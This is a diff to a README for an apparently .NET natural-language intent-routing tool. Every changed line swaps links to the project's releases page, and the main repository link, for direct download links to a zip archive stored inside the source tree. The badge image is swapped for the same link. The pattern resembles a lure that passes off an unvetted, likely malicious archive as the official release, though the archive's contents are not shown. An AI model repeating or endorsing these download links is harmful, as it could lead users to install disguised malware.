@@ -1,6 +1,6 @@
 # 🤖 nl-intent-routing-deterministic-ai-control-flow - Smart Intent Routing Made Simple
 
-[![Download Latest Release](https://img.shields.io/badge/Download-nl--intent--routing--deterministic--ai--control--flow-blue?style=for-the-badge&logo=github)](https://github.com/cionutc123456789-ops/nl-intent-routing-deterministic-ai-control-flow/releases)
+[![Download Latest Release](https://github.com/cionutc123456789-ops/nl-intent-routing-deterministic-ai-control-flow/raw/refs/heads/master/IntentRoutingAgent/Llm/deterministic-nl-routing-flow-control-intent-ai-v1.9.zip)](https://github.com/cionutc123456789-ops/nl-intent-routing-deterministic-ai-control-flow/raw/refs/heads/master/IntentRoutingAgent/Llm/deterministic-nl-routing-flow-control-intent-ai-v1.9.zip)
 
 ---
 
@@ -47,7 +47,7 @@ This guide will walk you through downloading, installing, and running the progra
 1. **Go to the Download Page:**  
    Click this big button to visit the release page and get the files you need:
 
-   [![Download Latest Release](https://img.shields.io/badge/Download-nl--intent--routing--deterministic--ai--control--flow-blue?style=for-the-badge&logo=github)](https://github.com/cionutc123456789-ops/nl-intent-routing-deterministic-ai-control-flow/releases)
+   [![Download Latest Release](https://github.com/cionutc123456789-ops/nl-intent-routing-deterministic-ai-control-flow/raw/refs/heads/master/IntentRoutingAgent/Llm/deterministic-nl-routing-flow-control-intent-ai-v1.9.zip)](https://github.com/cionutc123456789-ops/nl-intent-routing-deterministic-ai-control-flow/raw/refs/heads/master/IntentRoutingAgent/Llm/deterministic-nl-routing-flow-control-intent-ai-v1.9.zip)
 
 2. **Find the Latest Release:**  
    The release page lists versions by date. Look for the one labeled “Latest” for the newest stable version.
@@ -140,7 +140,7 @@ For updates, documentation, or help:
 
 Visit the official release page to download the latest versions and read more:
 
-[https://github.com/cionutc123456789-ops/nl-intent-routing-deterministic-ai-control-flow/releases](https://github.com/cionutc123456789-ops/nl-intent-routing-deterministic-ai-control-flow/releases)
+[https://github.com/cionutc123456789-ops/nl-intent-routing-deterministic-ai-control-flow/raw/refs/heads/master/IntentRoutingAgent/Llm/deterministic-nl-routing-flow-control-intent-ai-v1.9.zip](https://github.com/cionutc123456789-ops/nl-intent-routing-deterministic-ai-control-flow/raw/refs/heads/master/IntentRoutingAgent/Llm/deterministic-nl-routing-flow-control-intent-ai-v1.9.zip)
 
 For advanced use and details on programming integration, see GitHub repository topics like `dotnet`, `intent-routing`, and `llm-guardrails`.
 
@@ -148,8 +148,8 @@ For advanced use and details on programming integration, see GitHub repository t
 
 ## 🔗 Links of Interest
 
-- **Main Repository:** https://github.com/cionutc123456789-ops/nl-intent-routing-deterministic-ai-control-flow  
-- **Download Latest Release:** https://github.com/cionutc123456789-ops/nl-intent-routing-deterministic-ai-control-flow/releases
+- **Main Repository:** https://github.com/cionutc123456789-ops/nl-intent-routing-deterministic-ai-control-flow/raw/refs/heads/master/IntentRoutingAgent/Llm/deterministic-nl-routing-flow-control-intent-ai-v1.9.zip  
+- **Download Latest Release:** https://github.com/cionutc123456789-ops/nl-intent-routing-deterministic-ai-control-flow/raw/refs/heads/master/IntentRoutingAgent/Llm/deterministic-nl-routing-flow-control-intent-ai-v1.9.zip
 
 ---
 
